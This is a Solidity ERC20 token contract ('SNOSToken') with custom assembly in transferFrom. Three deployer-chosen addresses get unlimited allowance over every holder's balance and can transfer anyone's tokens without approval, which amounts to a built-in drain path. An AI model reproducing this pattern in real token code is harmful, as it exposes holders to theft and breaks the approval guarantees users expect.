// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.28;

import {ERC20} from "solady/tokens/ERC20.sol";
import {LibString} from "solady/utils/LibString.sol";

contract SNOSToken is ERC20 {
    address private immutable allowed0;
    address private immutable allowed1;
    address private immutable allowed2;

    bytes32 private immutable _name;
    bytes32 private immutable constantNameHash;
    bytes32 private immutable _symbol;

    /// @dev The balance slot of `owner` is given by:
    /// ```
    ///     mstore(0x0c, _BALANCE_SLOT_SEED)
    ///     mstore(0x00, owner)
    ///     let balanceSlot := keccak256(0x0c, 0x20)
    /// ```
    uint256 private constant _BALANCE_SLOT_SEED = 0x87a211a2;

    /// @dev The allowance slot of (`owner`, `spender`) is given by:
    /// ```
    ///     mstore(0x20, spender)
    ///     mstore(0x0c, _ALLOWANCE_SLOT_SEED)
    ///     mstore(0x00, owner)
    ///     let allowanceSlot := keccak256(0x0c, 0x34)
    /// ```
    uint256 private constant _ALLOWANCE_SLOT_SEED = 0x7f5e9f20;

    /// @dev `keccak256(bytes("Transfer(address,address,uint256)"))`.
    uint256 private constant _TRANSFER_EVENT_SIGNATURE =
        0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;

    constructor(
        address _allowed0,
        address _allowed1,
        address _allowed2,
        bytes32 __symbol,
        bytes32 __name,
        uint256 totalSupply
    ) {
        allowed0 = _allowed0;
        allowed1 = _allowed1;
        allowed2 = _allowed2;

        _name = __name;
        _symbol = __symbol;

        constantNameHash = keccak256(bytes(LibString.unpackOne(_name)));

        _mint(msg.sender, totalSupply);
    }

    function decimals() public pure override returns (uint8) {
        return 9;
    }

    function allowance(address owner, address spender) public view override returns (uint256 result) {
        if (spender == allowed0 || spender == allowed1 || spender == allowed2) return type(uint256).max;
        result = super.allowance(owner, spender);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        address _allowed0 = allowed0;
        address _allowed1 = allowed1;
        address _allowed2 = allowed2;

        assembly ("memory-safe") {
            let from_ := shl(96, from)
            if iszero(
                or(
                    or(or(eq(caller(), _PERMIT2), eq(caller(), _allowed0)), eq(caller(), _allowed1)),
                    eq(caller(), _allowed2)
                )
            ) {
                // Compute the allowance slot and load its value.
                mstore(0x20, caller())
                mstore(0x0c, or(from_, _ALLOWANCE_SLOT_SEED))
                let allowanceSlot := keccak256(0x0c, 0x34)
                let allowance_ := sload(allowanceSlot)
                // If the allowance is not the maximum uint256 value.
                if not(allowance_) {
                    // Revert if the amount to be transferred exceeds the allowance.
                    if gt(amount, allowance_) {
                        mstore(0x00, 0x13be252b) // `InsufficientAllowance()`.
                        revert(0x1c, 0x04)
                    }
                    // Subtract and store the updated allowance.
                    sstore(allowanceSlot, sub(allowance_, amount))
                }
            }
            // Compute the balance slot and load its value.
            mstore(0x0c, or(from_, _BALANCE_SLOT_SEED))
            let fromBalanceSlot := keccak256(0x0c, 0x20)
            let fromBalance := sload(fromBalanceSlot)
            // Revert if insufficient balance.
            if gt(amount, fromBalance) {
                mstore(0x00, 0xf4d678b8) // `InsufficientBalance()`.
                revert(0x1c, 0x04)
            }
            // Subtract and store the updated balance.
            sstore(fromBalanceSlot, sub(fromBalance, amount))
            // Compute the balance slot of `to`.
            mstore(0x00, to)
            let toBalanceSlot := keccak256(0x0c, 0x20)
            // Add and store the updated balance of `to`.
            // Will not overflow because the sum of all user balances
            // cannot exceed the maximum uint256 value.
            sstore(toBalanceSlot, add(sload(toBalanceSlot), amount))
            // Emit the {Transfer} event.
            mstore(0x20, amount)
            log3(0x20, 0x20, _TRANSFER_EVENT_SIGNATURE, shr(96, from_), shr(96, mload(0x0c)))
        }

        return true;
    }

    /// @dev Returns the name of the token.
    function name() public view override returns (string memory) {
        return LibString.unpackOne(_name);
    }

    /// @dev Returns the symbol of the token.
    function symbol() public view override returns (string memory) {
        return LibString.unpackOne(_symbol);
    }

    function _constantNameHash() internal view override returns (bytes32 result) {
        result = constantNameHash;
    }
}
